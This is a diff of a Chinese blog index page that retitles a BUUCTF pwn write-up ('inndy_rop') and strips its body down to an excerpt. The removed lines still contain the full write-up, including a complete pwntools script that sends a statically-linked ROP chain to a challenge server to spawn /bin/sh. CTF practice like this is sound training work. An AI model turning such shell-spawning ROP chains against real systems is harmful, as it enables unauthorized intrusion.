@@ -164,24 +164,30 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-【无标题】" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-buuctf-inndy_rop" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/08/buuctf-inndy_rop/">buuctf-inndy_rop_——wp</a>
+    </h1>
+  
+
+        
+        <a href="/2022/01/08/buuctf-inndy_rop/" class="archive-article-date">
+  	<time datetime="2022-01-08T08:46:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-08</time>
+</a>
+        
+      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="buuctf-pwn-innd-rop"><a href="#buuctf-pwn-innd-rop" class="headerlink" title="buuctf-pwn-innd_rop"></a>buuctf-pwn-innd_rop</h1><h3 id="查看文件保护"><a href="#查看文件保护" class="headerlink" title="查看文件保护"></a>查看文件保护</h3><p><img src="https://img-blog.csdnimg.cn/b4bdce85c7304ad68530f6a3ddae81a6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAeHVhb2h1MTIz,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">32位程序，开启了nx保护。</p>
-<h3 id="拖入ida，直接f5会报错"><a href="#拖入ida，直接f5会报错" class="headerlink" title="拖入ida，直接f5会报错"></a>拖入ida，直接f5会报错</h3><p><img src="https://img-blog.csdnimg.cn/b65b964ab1ff4b469890f4729c8305df.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAeHVhb2h1MTIz,size_20,color_FFFFFF,t_70,g_se,x_16">遇到这种情况，点击ida左上角options-&gt;general后出现如下图界面后，勾选stack pointer。<br><img src="https://img-blog.csdnimg.cn/dcf5fbe35a994da58eb1c05d08c30040.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAeHVhb2h1MTIz,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">然后选中报错地址的上一行，右击，然后点击change stack pointer，出现如下图界面，然后在sp那里的值前面加一个”-“就可以了。然后再按f5.<br><img src="https://img-blog.csdnimg.cn/67b6c34fc6c9431fbf4576a132bfeb8a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAeHVhb2h1MTIz,size_19,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">进行反汇编，进入main函数，只有overflow，进入overflow函数，如下图。发现溢出。但左边列表里只有静态编译的结果，所以这题无法进行常规的泄露libc之类的。<br><img src="https://img-blog.csdnimg.cn/19e041530eb5499e84d2c75359619f51.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAeHVhb2h1MTIz,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/56af6c0bbc8a412c8b31600fffa04abf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAeHVhb2h1MTIz,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>直接用ROPgadget工具，可以直接利用该程序的gadget拼凑连接成rop链。</p>
-<blockquote>
-<p>ROPgadget –binary inndy_rop –ropgadget  </p>
-</blockquote>
-<p>在终端输入后，如下图<br><img src="https://img-blog.csdnimg.cn/b32df14696af49d6b366014486b8fbda.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAeHVhb2h1MTIz,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">然后自己构造payload，偏移+ropchain</p>
-<blockquote>
-<p>from pwn import*<br>from struct import pack<br>context(os=’linux’,arch=’i386’,log_level=’debug’)<br>r=remote(“node4.buuoj.cn”,26710)  </p>
-<p>p=b’a’*(0x0c+0x04)<br>p+=pack(‘&lt;I’, 0x0806ecda) # pop edx ; ret<br>p+=pack(‘&lt;I’, 0x080ea060) # @ .data<br>p+=pack(‘&lt;I’, 0x080b8016) # pop eax ; ret<br>p+=’/bin’<br>p+=pack(‘&lt;I’, 0x0805466b) # mov dword ptr [edx], eax ; ret<br>p+=pack(‘&lt;I’, 0x0806ecda) # pop edx ; ret<br>p+=pack(‘&lt;I’, 0x080ea064) # @ .data + 4<br>p+=pack(‘&lt;I’, 0x080b8016) # pop eax ; ret<br>p+=’//sh’<br>p+=pack(‘&lt;I’, 0x0805466b) # mov dword ptr [edx], eax ; ret<br>p+=pack(‘&lt;I’, 0x0806ecda) # pop edx ; ret<br>p+=pack(‘&lt;I’, 0x080ea068) # @ .data + 8<br>p+=pack(‘&lt;I’, 0x080492d3) # xor eax, eax ; ret<br>p+=pack(‘&lt;I’, 0x0805466b) # mov dword ptr [edx], eax ; ret<br>p+=pack(‘&lt;I’, 0x080481c9) # pop ebx ; ret<br>p+=pack(‘&lt;I’, 0x080ea060) # @ .data<br>p+=pack(‘&lt;I’, 0x080de769) # pop ecx ; ret<br>p+=pack(‘&lt;I’, 0x080ea068) # @ .data + 8<br>p+=pack(‘&lt;I’, 0x0806ecda) # pop edx ; ret<br>p+=pack(‘&lt;I’, 0x080ea068) # @ .data + 8<br>p+=pack(‘&lt;I’, 0x080492d3) # xor eax, eax ; ret<br>p+=pack(‘&lt;I’, 0x0807a66f) # inc eax ; ret<br>p+=pack(‘&lt;I’, 0x0807a66f) # inc eax ; ret<br>p+=pack(‘&lt;I’, 0x0807a66f) # inc eax ; ret<br>p+=pack(‘&lt;I’, 0x0807a66f) # inc eax ; ret<br>p+=pack(‘&lt;I’, 0x0807a66f) # inc eax ; ret<br>p+=pack(‘&lt;I’, 0x0807a66f) # inc eax ; ret<br>p+=pack(‘&lt;I’, 0x0807a66f) # inc eax ; ret<br>p+=pack(‘&lt;I’, 0x0807a66f) # inc eax ; ret<br>p+=pack(‘&lt;I’, 0x0807a66f) # inc eax ; ret<br>p+=pack(‘&lt;I’, 0x0807a66f) # inc eax ; ret<br>p+=pack(‘&lt;I’, 0x0807a66f) # inc eax ; ret<br>p+=pack(‘&lt;I’, 0x0806c943) # int 0x80  </p>
-<p>r.sendline(p)<br>r.interactive()  </p>
-</blockquote>
-<h3 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h3><p><img src="https://img-blog.csdnimg.cn/417d6e782b6f486b9370c6dac18d1989.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAeHVhb2h1MTIz,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-
+        <h1 id="buuctf-pwn-inndy-rop"><a href="#buuctf-pwn-inndy-rop" class="headerlink" title="buuctf-pwn-inndy_rop"></a>buuctf-pwn-inndy_rop</h1>
+        
+          <a class="article-more-a" href="/2022/01/08/buuctf-inndy_rop/#more">more >></a>
+        
       
 
       
@@ -193,7 +199,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/08/%E3%80%90%E6%97%A0%E6%A0%87%E9%A2%98%E3%80%91/">展开全文 >></a>
+          <a class="article-more-a" href="/2022/01/08/buuctf-inndy_rop/">展开全文 >></a>
         </p>
       
 
